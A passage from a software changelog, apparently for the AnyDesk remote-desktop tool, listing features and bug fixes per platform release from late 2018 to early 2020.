- Fixed privacy not working on certain machines
- Fixed a bug that the privacy permission was transmitted wrong
- Several minor bugfixes
Other Changes
- Refactored privacy to match windows behaviour
17.02.2020 - 5.5.2 (Linux)
--------------------------
Added features:
- Added lock account on session end feature
Fixed bugs:
- Fixed a memory leak in the backend
- Fixed privacy/input blocking crashing certain versions of i915 driver
- Fixed a bug in the keyboard code
- Improved minor GUI details
- Refactored X11 code to put much less load on X Serer
- Fixed primary monitor not beeing selected on session start
- Refactored GTK code to prevent images from leaking
07.02.2020 - 5.4.5 (macOS)
----------------------------
New Features
- User settings for managing keyboard shortcuts behaviour
- "Host key" option which allows you to use Right Command key to control the local macOS
- Added support for "Home" and "Back" buttons when connected to remotely to Android device
Fixed Bugs
- Connection to macOS login window fixed
- Fixed crash on incoming connection which occurred in certain network configurations
- Reduced number of user password requests in AnyDesk installer
- Fixed issue when user is not able to reconnect after updating AnyDesk remotely
- Fixed crash on macOS 10.10 Yosemite related to custom AnyDesk configurations
- UI improvements
16.01.2020 - 4.1.1 (iOS)
----------------------------
Fixed Bugs
- Fixed bugs in displaying keyboard when hardware keyboard is connected to
device.
- Fixed "Take screenshot" feature.
Other Changes
- Touchpad mode is now default mode.
14.01.2020 - 5.4.2 (macOS)
----------------------------
Fixed Bugs
- Improved keyboard input handling
- Fixed freeze when remote side disallow clipboard permission
- Fixed issue when user unable to reconnect after installing AnyDesk update
- "Set password for unattended access..." leads to proper location
- Fixed crash on multiple connection retry attempt
- File Manager upload function fixed
- "Take Screenshot" function is fixed
- Accept Window updates it's content even when miniaturized into Dock
18.12.2019 - 5.4.2 (Windows)
----------------------------
Fixed Bugs
- Fixed some minor bugs.
13.12.2019 - 4.1.0 (iOS)
----------------------------
New Features
- Local cursor in touchpad mode.
- Disable auto-lock.
Fixed Bugs
- Fixed crashes.
Other Changes
- Language taken from iOS language setting
11.12.2019 - 5.4.1 (macOS)
----------------------------
Fixed Bugs
- Addressed "desk\_rt\_ipc\_error" issue
- Fixed crash on incoming chat message
- Installation process has been improved
- System language autodetect issue is fixed
- Fixed display of client name in recent sessions list
- Fixed indicator of remote displays
- Fixed mouse cursor shape when using remote Windows
- Now it's possible to miniaturize Accept window into Dock
10.12.2019 - 5.3.6 (Android)
----------------------------
Fixed Bugs
- Fixed crash
05.12.2019 - 5.3.4 (Android)
----------------------------
Fixed Bugs
- Improved controls via remote control
- AnyDesk is now reachable right after boot
- Fixed terminating the app
- Fixed long press on special keys
- Fixed chinese language selection
- Minor improvements and fixes
04.12.2019 - 5.4.0 (macOS)
----------------------------
New Features
- Implemented screen privacy feature.
Enabling privacy mode during a session will disable the monitor on
the remote side so the screen contents are hidden for anyone with
physical access to the remote device. Interference/computer interaction
attempt from the remote side will be prevented automatically by locking
the screen.
- Blocking remote input.
Mouse and keyboard input can now blocked for the computer being controlled
- Automatic Screen lock when remote session ended
Fixed Bugs
- Improved application responsiveness
- Fixed bug when 2 AnyDesk were opened on user login
- Minor UI layout fixes
- Improved color transfer
- Stability improvements
- Fixed crash when typing into address bar
03.12.2019 - 5.5.1 (Linux)
--------------------------
Added features
- Privacy indicator in the statusbar to always reflect privacy status
- Privacy will try to disable the screensaver to avoid failing
- Added unattended access priviledges in the security settings which can
override the standart permissions if connected via unattended access
Fixed Bugs
- Privacy will attempt to re-initialize if failed
- Privacy will now fail if some other tools tamper with gamma (e.g. redshift)
- Fixed sometimes input not beeing blocked in privacy as well as sometimes not
beeing unblocked on privacy end
- Fixed wrong permissions in the backend
- Minor bugfixes in the filetransfer
- Fixed a wrong error message when registering an alias that is too long
- Fixed an issue where the recording path could not be set
- Fixed a bug that the decimal point on the numpad was not transmitted
correctly
- Fixed a deadlock that could occur on the backend side if text was input too
fast from the frontend
- Several minor bugfixes
Other Changes
- Refactored privacy to match windows behaviour
21.11.2019 - 5.4.0 (Windows)
----------------------------
New Features
- Implemented screen privacy feature for Windows 8 and 10.
Enabling privacy mode during a session will disable the monitor on the remote side so the screen contents
are hidden for anyone with physical access to the remote device.
Input from the remote side will be blocked automatically during privacy mode for the default desktop.
- The session player can now jump to a specific point in time of the session recording.
Fixed Bugs
- Switching the desktop did not restore input block state.
- Added dialog in case the remote side automatically denied a printer job due to permission settings.
- Fixed automatic registration of aliases in custom namespaces in case of updating an installed custom client.
- On trying to register an alias that was too long it was reported that registration failed because an alias
has been registered already.
- The remote state of NumLock has been altered before session start.
- Fixed File Manager address field not handling 'Enter'.
- A couple of buttons in the File Manager could be resized to size zero.
- After switching sides the File Manager did not show the remote folder contents.
- The File Manager did not show the session close dialog in case the session was closed from the other side.
Other Changes
- The install panel's path edit now starts the installation on receiving 'Enter'.
- Address Book items now offer to create a TCP tunnel.
- The hotkey for entering fullscreen mode now also allows to leave fullscreen mode.
- Changed the default value to enable the alternative set of permissions for Unattended Access to 'true'.
By doing so the alternative set will be used directly after setting up a password for Unattended Access
and using it to connect, effectively granting all permissions to the user connecting.
19.11.2019 - 5.3.2 (Android)
----------------------------
Fixed Bugs
- Fixed initial file transfer button visibility
18.11.19 - 5.5.0 (Linux)
New Features
- Added VPN connection mode
With this mode two PCs can be put into a private network over a secured connection
- Added transmission of Android special keys
18.11.2019 - 5.1.5 (macOS)
----------------------------
Fixed Bugs
- Fixed endless "Waiting for image" state on icoming connection from Windows 10
- Faster application start
- Improved mouse and touchpad scroll handling
- Minor UI layout fixes
- Fixed crash on trying to connect to offline remote desktop
- Improved support for older macOS versions
14.11.2019 - 5.3.0 (Android)
----------------------------
New Features
- Support for multi touch events
- Privacy feature settings
- VPN
- Automatically hide menu button
- Seeking in session player
- Support for dark mode
Fixed Bugs
- Fixed mouse scroll on Samsung DEX
- Fixed clipboard file transfer
- Improved network connection stability
- Improved keyboard and dpad navigation
- Minor improvements and fixes
05.11.2019 - 5.1.4 (macOS)
--------------------------
Fixed Bugs
- Fixed an issue when Mac may not go to 'sleep' after AnyDesk session has
ended unexpectedly
- Fixed text corruption in 'New connection' window
- Fixed incorrect 'Newer version available' message
- Fixed user alias display in Chat window
31.10.2019 - 5.4.1 (Linux)
Fixed Bugs
Fixed privacy not working on certain machines
Fixed a bug that the privacy permission was transmitted wrong
24.10.2019 - 5.4.0 (Linux)
--------------------------
New Features
- Privacy feature has been added
Fixed Bugs
- Fixed a bug where the admin settings could be opened as normal user (but changes were not possible)
- Fixed wrong settings page beeing displayed when opening global settings
- Fixed a bug in the keyboard code
- Fixed a bug where the wrong keyboard layout was used in some distros and on some loginscreens
- Fixed several UI glitches
- Fixed the admin link not beeing shown in the recording settings
- Fixed the recording settings so that no useless config can be made
- Fixed some minor glitches in the custom client
- Fixed the display of the wrong error dialog in filetransfer
- Fixed a bug where the wrong accept window page was re-used
- Fixed onlinestates beeing shown incorrectly
- Fixed a memory leak in the filetransfer
- Fixed a crash/deadlock in the filetransfer
- Fixed searching and typing in the filebrowser via keyboard
- Fixed a bug where a network disconnect was not properly detected and took too much time
- Fixed a bug that caused the el8 package to reference el7
- Fixed a bug that would release modifier keys after typing one character on certain configs
- Fixed a bug where monitors of a secondary GPU were not accessible
24.10.2019 - 5.4.0 (BSD)
--------------------------
New Features
- Privacy feature has been added
Fixed Bugs
- Fixed some special keys not beeing transmitted correctly (e.g. PgUp/PgDown)
- Fixed a bug where the admin settings could be opened as normal user (but changes were not possible)
- Fixed wrong settings page beeing displayed when opening global settings
- Fixed a bug in the keyboard code
- Fixed a bug where the wrong keyboard layout was used in some distros and on some loginscreens
- Fixed several UI glitches
- Fixed the admin link not beeing shown in the recording settings
- Fixed the recording settings so that no useless config can be made
- Fixed some minor glitches in the custom client
- Fixed the display of the wrong error dialog in filetransfer
- Fixed a bug where the wrong accept window page was re-used
- Fixed onlinestates beeing shown incorrectly
- Fixed a memory leak in the filetransfer
- Fixed a crash/deadlock in the filetransfer
- Fixed searching and typing in the filebrowser via keyboard
- Fixed a bug where a network disconnect was not properly detected and took too much time
- Fixed a bug that would release modifier keys after typing one character on certain configs
- Fixed a bug where monitors of a secondary GPU were not accessible
21.10.2019 - 5.1.3 (macOS)
--------------------------
New Features
- Incoming connections are now displayed in the AnyDesk Dock icon
Fixed Bugs
- Fixed an issue when user is unable to reconnect macOS Catalina and Mojave after remote restart
- Fixed a deadlock when AnyDesk received incoming connection request during quiting
- Fixed application crash/freeze when typing into address field - Fixed bug when New connection window appeared without recent and discovered items
- Improved user interface localization
- Fixed look for Chat icon
- Fixed About window style and links
11.10.2019 - 4.0.0 (iOS)
------------------------
New Features
- added Discovery feature to find other AnyDesk instances in the local network
- possibility to connect to enterprise server
- keeping active session alive up to 30 seconds
- synchronising clipboard
- color id
- support up to 16 monitors
- dark mode
09.10.2019 - 5.1.2 (macOS)
--------------------------
Fixed Bugs
- Fixed crash on Mac OS 10.15 Catalina on keyboard shortcuts sent from iPhone
- Fixed remote typing issues in 'Auto' keyboard mode
- Fixed 'Update' function in the 'New version available' notifiaction
- Fixed About window style
08.10.2019 - 5.1.1 (macOS)
--------------------------
Fixed Bugs
- Fixed crash on Mac OS 10.15 Catalina for remote keyboard input
08.10.2019 - 5.1.0 (macOS)
--------------------------
New Features
- Added Discovery feature to find other AnyDesk instances in the local
network.
Fixed Bugs
- AnyDesk no longer overrides system.max\_files setting
- AnyDesk now warns user when necessary permissions are not granted
- Better support for Mac OS 10.15 Catalina
- Fixed crash when opening About window
- Fixed crash when playing recorded sessions
- Fixed crash when chat is used after session is over
25.09.2019 - 5.3.3 (Windows)
----------------------------
Fixed Bugs
- Discovered clients showed state offline on remote user image change.
- System settings were accessible after installation without the need of
entering credentials.
- Fixed crash during update of Discovery tooltips.
- Edit fields no longer make error sounds on pressing Enter, Escape and Tab.
- Fixed display of focused state for listview items in list mode.
- Quitting from the system tray was not possible.
- Fixed crash related to scrolling in file transfer panel
Other Changes
- Updated translations.
- Allowed to type into the address field directly after main window startup.
- Added support for Android special keys:
F5/Home/Pos1 -> Android Home
F6/Backspace -> Android Back
F7 -> Android Volume Down
F8 -> Android Volume Up
F9/Escape -> Android Power
F10 -> Android Menu
End -> Android DPAD Center
19.09.2019 - 5.1.2 (Raspberry Pi)
--------------------------
New Features:
- Added an emulated titlebar for the loginscreen to move and minimize the accept window
- Added remote reboot support
- Added more options to the command line interface
- Improved logging
- Added a rendering Method to utilize DISPMANX on RPi 2/3 to ensure faster rendering
- Added renderer for RPi 4 to ensure faster rendering
Fixed Bugs:
- Fixed a bug that switched the red and blue color on session start
- Fixed several UI bugs
- Fixed that a Custom Client could make outgoing connections when it was not supposed to
- Fixed a memory leak in the filetransfer
- Fixed searching by typing in the filebrowser
- Fixed a bug that prevented from selecting a different audio device
- Several minor bugfixes
09.09.2019 - 5.2.2 (Android)
----------------------------
New Features
- Added plugin for HTC devices.
06.09.2019 - 5.3.2 (Windows)
----------------------------
Fixed Bugs
- Fixed the URL handler. Session requests from inside MyAnyDesk should work again.
Other Changes
- The URL handler now accepts any number of leading slashes directly before the ID (they will be ignored).
30.08.2019 - 5.3.1 (Windows)
----------------------------
Fixed Bugs
- Fixed a crash on opening the security settings.
- Fixed a crash on cancelling a delete operation in the File Manager.
27.08.2019 - 5.3.0 (Windows)
----------------------------
New Features
- Added new set of permissions used during unattended access.
Those permissions have to be enabled explicitly first and will override the default permissions only
in case a session has been started using a password or token (unattended access).
Fixed Bugs
- TCP reverse rules where not saved correctly.
- Keyboard input to VirtualBox wasn't handled during translate mode or when connecting from Android.
- Fixed tag grouping for non-latin characters.
- Fixed cursor behaviour for systems using DPI per monitor.
- Fixed close button of tabs in the accept window.
- Discovery did not start after installation.
- Fixed a bug occuring during connecting to Windows Terminal Server resulting in an unresponsive service.
- According to the traces installation succeeded though the installer wasn't even started.
- Improved stability.
Other Changes
- Discovery now (re-)starts when a network connection becomes available.
- Extended Color ID feature to the search popup.
- Extended information included in the app's title.
- Extended information included in session tab titles.
- The UI setting for session comments is now disabled in case the feature is not available.
- Improved scam warning.
22.08.2019 - 5.2.0 (Android)
----------------------------
New Features
- Improved navigation with remote and keyboard.
- Improved speed on some devices.
- Added color id for speed dial items.
- Added online state to discovered items.
Fixed Bugs
- Fixed some remote image artifacts.
- Fixed issue with incoming connections waiting for image.
- Minor improvements and fixes.
16.08.2019 - 5.1.2 (Linux)
--------------------------
New Features:
- Added an emulated titlebar for the loginscreen to move and minimize the accept window
- Added remote reboot support
- Added more options to the command line interface
- Improved logging
Fixed Bugs:
- Fixed a bug that switched the red and blue color on session start
- Fixed several UI bugs
- Fixed that a Custom Client could make outgoing connections when it was not supposed to
- Fixed a memory leak in the filetransfer
- Fixed searching by typing in the filebrowser
- Fixed a bug that prevented from selecting a different audio device
05.08.2019 - 5.1.6 (Android)
----------------------------
New Features
- Added plugin for Savortex devices.
Fixed Bugs
- Fixed vulnerability in session playback that could lead to files getting overwritten.
15.07.2019 - 5.2.3 (Windows)
----------------------------
Fixed Bugs
- AnyDesk did not open in foreground in case it was downloaded and started using MS Edge.
12.07.2019 - 5.2.2 (Windows)
----------------------------
Fixed Bugs
- Fixed selection box tool.
- Fixed crash on click on restart button in miscellaneous settings.
- Fixed 'Change License Key...' button in the about panel.
- The File Manager downloaded the same file twice in some cases.
- Fixed handling of AltGr+a. This selected all text before and broke AltGr+a on polish keyboards.
- Fixed blocker for incoming connections.
- Fixed address not being shown correctly or incompletely in discovered clients.
- The Address Book accepted malformed addresses and could not delete them anymore.
- Fixed wrong address book being removed from the manage address books dialog while trying to delete a different one.
- Fixed address action 'Drop Link' for qualified addresses (AnyDeskID/domain/account).
- Fixed command line parsing of qualified addresses.
- Fixed broken traces.
- Fixed some tooltips.
- Minor fixes.
Other Changes
- Discovered clients can be searched for now by using user name, Alias, client ID, machine name and operating system.
- Improved display of search results.
- Discovery items can now be added to the Address Book using their context menu.
- Checkboxes and radio buttons can now be toggled using 'Space'.
11.07.2019 - 5.1.4 (Android)
----------------------------
Fixed Bugs
- Fixed missing pie menu for RTL languages.
- Fixed crashes due to invalid translations in some languages.
- Minor improvements and fixes.
27.06.2019 - 5.1.2 (Android)
----------------------------
Fixed Bugs
- Fixed crash due to invalid format in ukrainian translation.
- Fixed crash when stopping service.
- Fixed password dialog for unattended access.
- Fixed wrong user name in discovered items.
- Minor improvements and fixes.
13.06.2019 - 5.1.1 (Linux)
--------------------------
Fixed Bugs
- Fixed a memory leak in the X11 code
- Fixed a bug that would not install the service after package upgrade
- Fixed a bug with file permissions in package
13.06.2019 - 5.1.1 (Raspberry Pi)
---------------------------------
Fixed Bugs
- Fixed a memory leak in the X11 code
- Fixed a bug with file permissions in package
13.06.2019 - 5.1.1 (FreeBSD)
----------------------------
Fixed Bugs
- Fixed a memory leak in the X11 code
12.06.2019 - 5.1.0 (Raspberry Pi)
---------------------------------
New Features
- File transfer
- TCP tunneling
- Added Addressbook
- Added Input Blocker
- Settings for discovery added
- Added minimize button to Accept Window in loginscreens
- Added correct file attributes transmission for filetransfer
- Performance optimizations using modern SIMD instruction sets
- Auto-discovery (partly - discoverable only)
- Added more permissions to security settings
- Added new permission interface to backend
- Added connect to loginscreen features to rpm distros (systemd only)
- Added protocol handler for anydesk:// links
- Added Session Commenting
- Added Session Recording and Playback
- Added new permission interface in accept window
- Changing the permissions from the remote side is now forbidden (users cannot click in
the relevant parts of the accept window anymore from the remote side).
- Added restart button on language change in the settings
- Added connect to login screen feature for APT based distributions (only for X11)
- Added privacy settings to be on-par with the Windows port
- Changed default path of the chatlog to Documents folder
- Changed default path for the screenshots to Pictures folder
- Changed default path for file downloads to Downloads folder
- Added chatlog and screenshot path settings
- Added choose alias panel. The user can now choose an alias like in the
Windows port.
- Added popup menu to adress (Copy invitation, Copy adress, claim alias, etc)
- Added gksu and polkit functionality to enable the global settings
- Added bring to top on chat option
Fixed Bugs
- Fixed slow renderings on some machines due to too many buffer swaps
- Fixed a crash in the frontend on shutdown
- Fixed X11 related calls
- Several bugfixes in the filetransfer
- Multiple minor bugfixes
- Fixed a bug with capslock in the keyboard
- Fixed chat window
- Fixed crash on corrupted environ file in /proc
- Recording can now be prohibited by a permission
- Recording can be rewound
- Fixed config files handling and permissions
- Fixed glitchy ghost pointer (now it's less glitchy)
- Fixed incorrecly disabled mouse pointer
- Fixed address book tags behavior
- Fixed speed dial search
- Fixed several crashes
- GUI visual appearance improvements
- Fixed a bug that caused AnyDesk to grab the focus and disable window movement, etc
- Fixed many keyboard problems
- Fixed the keyboard acting weird after login
- Fixed AnyDesk displaying the wrong recording settings
- Fixed AnyDesk showing a forbidden cursor even when input is allowed
- Fixed some minor graphical glitches in the GUI
- Fixed that sometimes input was not possible on certain login screens
- Fixed a bug that caused anydesk to show a white screen after fast user switching
- Fixed the update link
- Moved the system informations into the session tab as button
- Fixed the icon not showing up on when using the debian package
- Fixed the Action Menu beeing sensitive even if the session was not yet established
- Fixed the passwort save box beeing sensitive even if storing the password is forbidden
- Fixed that a nonsense message was displayed when connecting to an unsupported display
server (e.g. Wayland).
- Fixed several bugs related to systemd
- Made TCP Holepunching better for systems running kernel >= 3.9
- Fixed the statusbar for active sessions
- Fixed a bug that spawned the global settings in a manner that passwords would be written to the wrong config file. Thus it was not possible to change the unattended PW in some cases
- Fixed a bug that crashed AnyDesk when entering an invalid ID
- Fixed connect via command line
- Fixed a bug that assigned a new ID when starting a local service after global was installed
- Fixed a bug in the TreeView that could lead to undefined behaviour
- Fixed file transfer issue with files containing spaces in the filename
- Fixed a bug that could crash AnyDesk during a file transfer is some special characters were in the filename
- Fixed an issue that prevented the switch sides feature from working
- Fixed a bug that could crash the tray icon
- Fixed a bug that could crash the audio settings
- Fixed the settings window not updating correctly
- Removed unneccessary dependencies from the debian package
- Fixed the command line interface
- Fixed a bug that prevented the custom logo from beeing shown
- Fixed the tray icon not autostarting in global mode
- Fixed connections to Windows Terminal Server.
- Fixed a problem which could lead to a crash of AnyDesk after running for several days.
- Fixed a crash when revoking control permissions.
- Fixed a problem that caused sending actions to the first connection
- Fixed some issues with the keyboard
- Fixed to send hotkeys like alt+f2 to other Linuxes
- Fixed that AnyDesk was left in fullscreen mode when the connection was closed
- Several minor bugfixes
Other Changes
- Updated icons
- Updated packaging
- Updated supported versions
12.06.2019 - 5.1.0 (FreeBSD)
----------------------------
New Features
- File transfer
- TCP tunneling
- Added Addressbook
- Added Input Blocker
- Settings for discovery added
- Added minimize button to Accept Window in loginscreens
- Added correct file attributes transmission for filetransfer
- Performance optimizations using modern SIMD instruction sets
- Auto-discovery (partly - discoverable only)
- Added more permissions to security settings
- Added new permission interface to backend
- Added connect to loginscreen features to rpm distros (systemd only)
- Added protocol handler for anydesk:// links
- Added Session Commenting
- Added Session Recording and Playback
- Added new permission interface in accept window
- Changing the permissions from the remote side is now forbidden (users cannot click in
the relevant parts of the accept window anymore from the remote side).
- Added restart button on language change in the settings
- Added connect to login screen feature for APT based distributions (only for X11)
- Added privacy settings to be on-par with the Windows port
- Changed default path of the chatlog to Documents folder
- Changed default path for the screenshots to Pictures folder
- Changed default path for file downloads to Downloads folder
- Added chatlog and screenshot path settings
- Added choose alias panel. The user can now choose an alias like in the
Windows port.
- Added popup menu to adress (Copy invitation, Copy adress, claim alias, etc)
- Added gksu and polkit functionality to enable the global settings
- Added bring to top on chat option
Fixed Bugs
- Fixed slow renderings on some machines due to too many buffer swaps
- Fixed a crash in the frontend on shutdown
- Fixed X11 related calls
- Several bugfixes in the filetransfer
- Multiple minor bugfixes
- Fixed a bug with capslock in the keyboard
- Fixed chat window
- Fixed crash on corrupted environ file in /proc
- Recording can now be prohibited by a permission
- Recording can be rewound
- Fixed config files handling and permissions
- Fixed incorrecly disabled mouse pointer
- Fixed address book tags behavior
- Fixed speed dial search
- Fixed several crashes
- GUI visual appearance improvements
- Performance improvements
- Fixed a bug that caused AnyDesk to grab the focus and disable window movement, etc
- Fixed many keyboard problems
- Fixed AnyDesk displaying the wrong recording settings
- Fixed AnyDesk showing a forbidden cursor even when input is allowed
- Fixed some minor graphical glitches in the GUI
- Fixed that sometimes input was not possible on certain login screens
- Fixed a bug that caused anydesk to show a white screen after fast user switching
- Fixed the update link
- Moved the system informations into the session tab as button
- Fixed the icon not showing up on when using the debian package
- Fixed the Action Menu beeing sensitive even if the session was not yet established
- Fixed the passwort save box beeing sensitive even if storing the password is forbidden
- Fixed that a nonsense message was displayed when connecting to an unsupported display
server (e.g. Wayland).
- Fixed several bugs related to systemd
- Fixed the statusbar for active sessions
- Fixed a bug that spawned the global settings in a manner that passwords would be written to the wrong config file. Thus it was not possible to change the unattended PW in some cases
- Fixed a bug that crashed AnyDesk when entering an invalid ID
- Fixed connect via command line
- Fixed a bug that assigned a new ID when starting a local service after global was installed
- Fixed a bug in the TreeView that could lead to undefined behaviour
- Fixed file transfer issue with files containing spaces in the filename
- Fixed a bug that could crash AnyDesk during a file transfer is some special characters were in the filename
- Fixed an issue that prevented the switch sides feature from working
- Fixed a bug that could crash the tray icon
- Fixed a bug that could crash the audio settings
- Fixed the settings window not updating correctly
- Removed unneccessary dependencies from the debian package
- Fixed the command line interface
- Fixed a bug that prevented the custom logo from beeing shown
- Fixed the tray icon not autostarting in global mode
- Fixed connections to Windows Terminal Server.
- Fixed a problem which could lead to a crash of AnyDesk after running for several days.
- Fixed a crash when revoking control permissions.
- Fixed a problem that caused sending actions to the first connection
- Fixed some issues with the keyboard<
- Fixed that AnyDesk was left in fullscreen mode when the connection was closed
- Several minor bugfixes
11.06.2019 - 5.1.0 (Linux)
--------------------------
New Features
- Added Input Blocker
- Settings for discovery added
- Added minimize button to Accept Window in loginscreens
- Added correct file attributes transmission for filetransfer
- Performance optimizations using modern SIMD instruction sets
Fixed Bugs
- Fixed slow renderings on some machines due to too many buffer swaps
- Fixed a crash in the frontend on shutdown
- Fixed X11 related calls
- Several bugfixes in the filetransfer
- Multiple minor bugfixes
- Fixed a bug with capslock in the keyboard
Other Changes
- Updated packaging
- Updated supported versions
07.06.2019 - 5.2.1 (Windows)
----------------------------
Fixed Bugs
- Some controls did not respond to mouse clicks when the mouse was moved between mouse down and up.
- The listview showed a chat log button even when there was no chat log.
- The discovery section disappeared in some situations.
06.06.2019 - 5.2.0 (Windows)
----------------------------
New Features
- Custom clients supporting only incoming session requests now use a minimal layout.
Other Changes
- Switch Sides is no longer supported for custom clients that cannot do both, connect and accept.
- Extended command line interface.
- Improved performance.
06.06.2019 - 5.1.0 (Android)
----------------------------
New Features
- Unattended access.
- Kickout feature.
- Improved speed.
Fixed Bugs
- Fixed crash in incoming connections.
- Minor improvements and fixes.
27.05.2019 - 5.1.2 (Windows)
----------------------------
Fixed Bugs
- Fixed a crash when AnyDesk could not find a preview image.
Other Changes
- Changed images for welcome panel.
23.05.2019 - 5.1.1 (Windows)
----------------------------
Fixed Bugs
- Fixed broken mouse handling in the search popup.
- Fixed lost keyboard focus when switching from the File Manager to a monitor.
- Fixed fullscreen mode on session start.
- Fixed a crash during rights elevation.
- Fixed discovery online states.
- Added missing TCP permission setting.
- Minor fixes
Other Changes
- Added a selection box tool.
- Selected items will now scroll into the visible area automatically.
- D3D fullscreen can now be minimized.
- Changed TCP default permission to true.
14.05.2019 - 5.1.0 (Windows)
----------------------------
New Features
- Added TCP-Forwarding for running sessions.
Fixed Bugs
- Capture settings did not show any setting.
- The Whiteboard did not work on Windows XP and on Windows 7 when Aero was disabled.
- The request elevation feature did not work after switching sides.
- When AnyDesk was running in the background for some time and the main window was started,
it did not respond for several seconds under certain conditions. The main window
should now react instantly to user input.
- After installation no discovered clients where shown.
- Fixed Discovery working only for simultaneously running clients of the same type.
Now all instances of AnyDesk should be able to use Discovery simultaneously,
for example when using vanilla and custom client at the same time.
- The screenshot menu item was not available.
- Fixed crash on popup close.
- Fixed crash when pressing 'Retry' after session end.
- Fixed crash in case AnyDesk could not get a cursor.
- Fixed GDI fullscreen being resizable.
- Fixed fullscreen mode when connecting to multi-monitor setups.
- On incoming session request the screensaver did not turn off.
AnyDesk now stops the system from turning it on during an active session or session request.
- On incoming session request sleeping monitors did not turn on.
AnyDesk now stops the system from turning them off during an active session or session request.
- Improved performance by temporarily removing some tooltips.
- Fixed drag operations started after closing an addresses context menu.
- Fixed address items being clickable only in certain areas.
- Fixed file transfer button in search popup.
- Fixed bug that caused new entries to be added to the wrong Address Book.
- Fixed synchronization of printer settings when using multiple instances of AnyDesk.
- Minor fixes.
Other Changes
- The Address Book deletion confirmation dialog now lists the Address Books to be deleted.
- On incoming chat messages AnyDesk's toolbar and Windows' taskbar will now flash.
- Moved connection trace to system folder.
- Updated localizations.
24.04.2019 - 5.0.0 (Linux)
--------------------------
New Features
- File transfer
- TCP tunneling
- Auto-discovery (partly - discoverable only)
Fixed Bugs
- Fixed chat window
- Fixed crash on corrupted environ file in /proc
- Recording can now be prohibited by a permission
- Recording can be rewound
- Fixed config files handling and permissions
- Fixed glitchy ghost pointer (now it's less glitchy)
- Fixed incorrecly disabled mouse pointer
- Fixed address book tags behavior
- Fixed speed dial search
- Fixed several crashes
- GUI visual appearance improvements
- Performance improvements
- Minor fixes
- Other fixes
Other Changes
- Updated icons
12.04.2019 - 5.0.5 (Windows)
----------------------------
Fixed Bugs
- The loopback (monitor) audio device could not be selected as an audio source after
selecting a specific device once.
- Fixed a crash which could occur when going in or out of fullscreen mode in D3D render mode.
- Fixed a bug which could lead to image corruption when going in or out of fullscreen mode.
- Improved behaviour of fullscreen mode when the user switches to another application than
AnyDesk and back to AnyDesk.
- Fixed a bug where the installer would crash when started twice.
- Under certain conditions, Drag&Drop was started when it was not supposed to start.
This should not happen anymore.
- AnyDesk prevented the screensaver to engage when the Accept Window was open. This
behaviour was changed so the screensaver is only prevented while an incoming session
is active.
- Fixed a crash which could occur under rare conditions when using the whiteboard
feature in Windows Server.
- Using the Address Book could cause AnyDesk to stop responding in rare situations.
- The Address Book now remembers the selected items during actions.
- Fixed a bug that caused the Address Book to not update anymore when the option
'Open Address Book on startup' was enabled.
- Improved stability.
Other Changes
- Implemented a progress display for the installer.
- Updated polish translation.
- Updated the Welcome tab.
08.04.2019 - 5.0.4 (Windows)
----------------------------
Fixed Bugs
- Generic stability improvements.
- Fixed default audio recording setting.
05.04.2019 - 5.0.3 (Windows)
----------------------------
Fixed Bugs
- Fixed a crash which could occur when AnyDesk was terminated.
- Fixed a rare crash on Windows 8.1 which occured when AnyDesk was started.
- Fixed popup placement when there is not enough screen space available.
- Fixed some high-DPI issues.
- Fixed scrolling in Windows 8.
- Added scrollbar to the address book selection menu.
- Updated translations for Chinese, Portuguese, French and Russian.
04.04.2019 - 5.0.2 (Windows)
----------------------------
Fixed Bugs
- Fixed a few minor bugs in the Address Book.
- No sessions can be created from the command line in case it is disabled in the client generator.
- Other minor bug fixes.
Other Changes
- Auto-Discovery is now only enabled when AnyDesk is installed. Otherwise, the user has to start it manually.
- Added a context menu to Address Book.
02.04.2019 - 5.0.2 (Android)
----------------------------
New Features
- Improved remote control speed.
- Showing pointer when remote control is possible and also on pointer move.
- Added default permissions for incoming connections in settings.
- Added settings for discovery.
- Minor improvements.
Fixed Bugs
- Fixed configuration for interactive access.
- Fixed gesture detection lockups.
- Improved stability.
- Minor bugfixes.
29.03.2019 - 5.0.1 (Windows)
----------------------------
Fixed Bugs
- User interface improvements
- Fixed a bug which could cause AnyDesk not to respond or crash in very rare cases.
- Fixed connection trace which sometimes was not stored correctly when AnyDesk was not installed.
27.03.2019 - 5.0.0 (Windows)
----------------------------
New Features
- New user interface design in browser style.
- Improved Address Book with Drag&Drop and better handling.
- Implemented remote printing feature for Windows 7, 8 and 10.
- Implemented auto discovery feature to find other AnyDesk instances in the local network.
- Added colour id to identify every participant in the network with a unique colour.
Fixed Bugs
- Fixed follow remote mouse cursor causing crashes and freezes.
- Fixed the command line parameter "--fullscreen".
- Added missing "Follow remote cursor" option in fullscreen mode.
- Improved stability.
Other Changes
- Updated localizations
21.03.2019 - 5.0.0 (Android)
----------------------------
New Features
- Improved user interface.
- Showing a tutorial on first start.
- Auto discovery of other AnyDesk instances in local network.
- Toggle full screen mode.
- Minor improvements.
Fixed Bugs
- Fixed OpenGL bug that could lead to graphic rendering errors.
- Fixed crash in file transfer.
- Fixed own addres card visibility issue with custom client.
- Fixed deleting wrong speed dial items.
- Minor bugfixes.
09.01.2019 - 4.3.4 (Android)
----------------------------
New Features
- Remote control of more Samsung devices.
- Improved address validation.
- Minor improvements.
Fixed Bugs
- Improved stability.
- Minor bugfixes.
09.01.2019 - 4.3.4 (Android)
----------------------------
New Features
- Remote control of more Samsung devices.
- Improved address validation.
- Minor improvements.
Fixed Bugs
- Improved stability.
- Minor bugfixes.
19.12.2018 - 4.3.2 (Android)
----------------------------
New Features
- Remote control of Samsung devices.
- Improved hole punching for direct connections.
- New proxy settings.
- New privacy settings.
- Improved mouse wheel scrolling.
Fixed Bugs
- Fixed missing/locked pie menu.
- Minor bugfixes.
14.12.2018 - 4.3.0 (Windows)
----------------------------
New Features
- Added a setting for Windows Terminal Servers to dis-/allow the remote user to see the list
of currently logged in users when asked for where to connect to.
- New command line parameter "--file-transfer" to start a file session from the command line.
- Added a feature which allows to terminate running sessions from inside AnyDesk. This allows
users to start sessions when the session limit of the licence is exceeded by freeing sessions.
- Windows Terminal Server: Added a dialog which allows to choose a user.
- AnyDesk now connects using port 6568 in addition to the standard ports 80 and 443.
- Support for perfect forward secrecy when communicating with the server.
New Features in my.anydesk.com
- A password for custom AnyDesk clients can now be preset in my.anydesk.com
- Implemented auto-add feature which allows preconfiguring a custom AnyDesk client so it gets
added to a specific address book on first installation.
Fixed Bugs
- In some cases, AnyDesk would display the unknown mouse cursor ("?") in cases where it could
have displayed the actual mouse cursor instead. The unknown mouse cursor is used in cases
when there is no mouse attached to the device and AnyDesk can not obtain a mouse cursor icon
or force the system to display a mouse cursor.
